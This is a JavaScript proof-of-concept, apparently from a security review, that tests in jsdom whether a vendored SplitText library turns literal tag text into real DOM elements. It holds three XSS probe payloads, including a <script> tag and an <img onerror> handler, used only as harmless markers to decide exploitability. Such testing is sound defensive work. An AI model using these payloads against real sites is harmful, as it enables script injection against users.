// Proof-of-concept: does SplitText (vendors_min.js line 1431) let a literal
// "<tag>" sitting inside a text node's nodeValue turn into a REAL DOM element
// once SplitText rebuilds the markup via outerHTML?
//
// This loads the EXACT bytes extracted from the user's uploaded file
// (splittext_from_vendor.js == line 1431 of vendors_min.js, byte-for-byte),
// not a rewritten or "cleaned up" copy.

const { JSDOM } = require("jsdom");

const dom = new JSDOM(`<!DOCTYPE html><html><body><div id="target"></div></body></html>`);
global.window = dom.window;
global.document = dom.window.document;
global.navigator = dom.window.navigator;
global.Node = dom.window.Node;
global.getComputedStyle = dom.window.getComputedStyle.bind(dom.window);

// Load the module exactly as the browser/webpack would (CommonJS branch of its UMD wrapper)
const SplitTextModule = require("./splittext_from_vendor.js");
const SplitText = SplitTextModule.SplitText;

console.log("Loaded export:", typeof SplitText, SplitText && SplitText.version);

function runPayload(label, payloadText) {
  console.log("\n=== " + label + " ===");
  const target = document.getElementById("target");
  target.innerHTML = ""; // reset
  // Simulate: some upstream code safely wrote user-controlled data into the
  // page as TEXT (the normal, safe way) e.g. target.textContent = userInput.
  // That is exactly the kind of "DOM text" CodeQL's source category covers.
  target.textContent = payloadText;

  console.log("Text node BEFORE SplitText runs (nodeValue): " + JSON.stringify(target.firstChild.nodeValue));

  let split;
  try {
    split = SplitText.create(target, { type: "chars,words" });
  } catch (e) {
    console.log("SplitText.create threw:", e.message);
    return;
  }

  console.log("target.innerHTML AFTER SplitText runs:\n" + target.innerHTML);

  // The actual exploit check: did any of the attacker's tag names become
  // REAL parsed elements anywhere under target?
  const injectedTagNames = ["b", "img", "script", "svg", "iframe"];
  let foundReal = [];
  for (const tag of injectedTagNames) {
    const hits = target.querySelectorAll(tag);
    if (hits.length) foundReal.push(tag + " x" + hits.length);
  }

  if (foundReal.length) {
    console.log("!!! REAL INJECTED ELEMENTS FOUND:", foundReal.join(", "), "=> EXPLOITABLE");
  } else {
    console.log("No injected elements created (only SplitText's own <div>/<span> wrappers exist) => NOT exploitable");
  }
}

// Payload 1: classic tag-injection probe
runPayload("Literal <b> tag inside text", "hello <b>PWNED</b> world");

// Payload 2: script tag probe
runPayload("Literal <script> tag inside text", "hi <script>window.__pwned=1<\/script> bye");

// Payload 3: event-handler-bearing tag probe
runPayload("Literal <img onerror> tag inside text", 'look <img src=x onerror="window.__pwned=2"> here');
